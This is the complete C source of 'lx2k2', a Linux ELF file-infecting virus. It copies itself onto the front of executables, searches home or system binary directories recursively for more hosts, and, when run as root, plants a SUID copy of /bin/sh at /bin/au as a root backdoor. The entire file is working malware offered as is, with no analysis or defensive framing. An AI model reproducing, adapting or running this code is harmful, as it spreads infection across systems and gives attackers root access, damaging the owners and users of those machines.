/* lx2k2 Virus
 * This is a trivial ELF file infector.  It simply pre-pends itself
 * to the beginning of ELF executibles.  When it runs it copies the
 * later half of itself to a temporary file and executes it.  Then
 * it deletes the temp file.
 *
 * Based on Silvio Cesare File Virus
 * 
 * Coded by Macabre
 *
 * v.0.1
 * Features:
 *	Basic ELF Append virus
 *	Recursive directory search of (/home/user if ! root else /bin)
 *	Sample root kit payload (Creates /bin/au + SUID root)
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <pwd.h>

// PARASITE_LENGTH must equal the size of the compiled virus //
#define PARASITE_LENGTH 10710
#define MAGIC 6585
#define TMPFILE_TEMPLATE "/tmp/.lx2k2XXXXXX"
#define MAX_INFECT 25
#define MAX_BUF 1024

static int magic = MAGIC;
int infections=0;

int infect(char *filename, int hd, char *virus)
{
   int fd;
   struct stat stat;
   char *data;
   char tmpfile[MAX_BUF];
   int tmagic;	  // Store files magic number
   int magicloc;  // Location of magic number
   Elf32_Ehdr ehdr;

/* Check ELF Header */
   if(read(hd,&ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 1;

   if(
	ehdr.e_ident[0] != ELFMAG0 ||
	ehdr.e_ident[1] != ELFMAG1 ||
	ehdr.e_ident[2] != ELFMAG2 ||
	ehdr.e_ident[3] != ELFMAG3
     ) return 1;

   if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) return 1;
   
// Comprobación de la arquitectura


#ifdef __amd64__

if (ehdr.e_machine != EM_X86_64) return 1; // AMD64

#elif __arm__

if (ehdr.e_machine != EM_ARM) return 1; // ARM

#else   
   
   if (ehdr.e_machine != EM_386) return 1;

#endif
   
   if (ehdr.e_version != EV_CURRENT) return 1;

/* Check for MAGIC number at EOF */
   if(fstat(hd, &stat) < 0) return 1;
   magicloc = stat.st_size - sizeof(magic);
   if( lseek(hd, magicloc, SEEK_SET) != magicloc ) return 1;

   if(read(hd, &tmagic, sizeof(magic)) != sizeof(magic)) return 1;
   if(tmagic == MAGIC) return 1;
   if(lseek(hd, 0, SEEK_SET) != 0) exit(1);

/* Create tmp file and Extract ourself into it */
   strncpy(tmpfile, TMPFILE_TEMPLATE, MAX_BUF);
   fd=mkstemp(tmpfile);
   if(fd<0) { printf("open(%s)",tmpfile);exit(1); }
   if (write(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;

/* Allocate memory for host file and read it in */
   data=(char *)malloc(stat.st_size);
   if(data==NULL) return 1;
   if(read(hd, data, stat.st_size) != stat.st_size) return 1;

/* Write host to end of our temp file */
   if(write(fd,data, stat.st_size) != stat.st_size) return 1;
/* Write magic number to EOF */
   if(write(fd,&magic, sizeof(magic)) != sizeof(magic)) return 1;

/* Return the original permisions and ownership */
   if(fchown(fd, stat.st_uid, stat.st_gid) < 0) return 1;
   if(fchmod(fd, stat.st_mode) < 0) return 1;
/* Rename tmp file overtop of original file */
   if(rename(tmpfile, filename) < 0) return 1;

   close(fd);

   infections++;
//printf("***Infected %s.\n", filename);

   return 0;
}

void scan_dir(char *directory, char *virus)
{
   int hd, vd;
   int filecnt;
   DIR *dd;
   struct dirent *dirp;
   struct stat stat;
   char vfile[256];
 
   /* Check current directory */
   dd = opendir(directory);
   dirp = readdir(dd);

   /* Go and find some files to infect */
   if(dirp != NULL) {
	for (filecnt=0; (dirp = readdir(dd)) !=NULL &&
			infections < MAX_INFECT; filecnt++)
	{
	strncpy(vfile, directory, 255);
	strcat(vfile, "/");
	strncat(vfile, dirp->d_name, 255-strlen(vfile));
	    hd=open(vfile, O_RDONLY, 0);
	    if(hd >= 0) {
		fstat(hd, &stat);
		if(S_ISDIR(stat.st_mode)) {
			if(strcmp(dirp->d_name, "..")) 
			    scan_dir(vfile, virus);
		} else if(S_ISREG(stat.st_mode)) {
			vd=open(vfile, O_RDWR, 0);
			if(vd >= 0)
				infect(vfile, vd, virus);
		}
		close(vd);
	    }
	    close(hd);
	}
	closedir(dd);
   }
}

void payload(void)
{
   srand (time(NULL));
   if((rand() % 5) == 0)
   	printf("lx2k2!!  Spreading the love ;)\n");
   system("cp /bin/sh /bin/au");
   system("chmod +s /bin/au");
}

int main(int argc, char *argv[], char *envp[])
{
   int fd, tmpfd;
   struct stat stat;
   int len;
   char *data1, virus[PARASITE_LENGTH];
   char tmpfile[MAX_BUF];
   struct passwd pwdent;
   uid_t uid;
   pid_t pid;
   
   /* Aquire file information about ourself */
   fd=open(argv[0], O_RDONLY, 0);
   if (fstat(fd, &stat) < 0) return 1;

   /* Read ourself into memory */
   if (read(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;

   /* Find files to infect */
   uid = geteuid();
   if(uid == 0) {
     /* Do some root stuff */
     scan_dir("/sbin", virus);
     if(infections < MAX_INFECT) scan_dir("/usr/sbin", virus);
     if(infections < MAX_INFECT) scan_dir("/usr/local/sbin", virus);
     if(infections < MAX_INFECT) scan_dir("/bin", virus);
     if(infections < MAX_INFECT) scan_dir("/usr/bin", virus);
     if(infections < MAX_INFECT) scan_dir("/usr/local/bin", virus);
     if(infections < MAX_INFECT) scan_dir("/root", virus);
//     if(infections < MAX_INFECT) scan_dir("/", virus);
     payload();
   } else {
      pwdent=*getpwuid(uid);
      scan_dir(pwdent.pw_dir, virus);
   }
//   scan_dir(".", virus);

   /* Allright now we need to run our host file */
   /* Assing space for original host */
   len = stat.st_size - PARASITE_LENGTH;
   data1=(char*)malloc(len);
   if(data1 == NULL) return 1;
   if(lseek (fd, PARASITE_LENGTH, SEEK_SET) != PARASITE_LENGTH) return 1;

   /* Read host into memory */
   if(read(fd, data1, len) != len) return 1; 
   close(fd);

   /* Write host to a temporary file */
   strncpy(tmpfile, TMPFILE_TEMPLATE, MAX_BUF);
   tmpfd = mkstemp(tmpfile);
   if(tmpfd <0) return 1;
   if (write(tmpfd, data1, len) != len) return 1;
   fchmod(tmpfd, stat.st_mode);
   free(data1);
   close(tmpfd);

   /* Fork off a process to run host */
   pid = fork();
   if (pid <0) exit(1);
   if(pid ==0) exit(execve(tmpfile, argv, envp));
   if(waitpid(pid, NULL, 0) != pid) exit(1);
   unlink(tmpfile);
   exit(0);

   return 0;
}
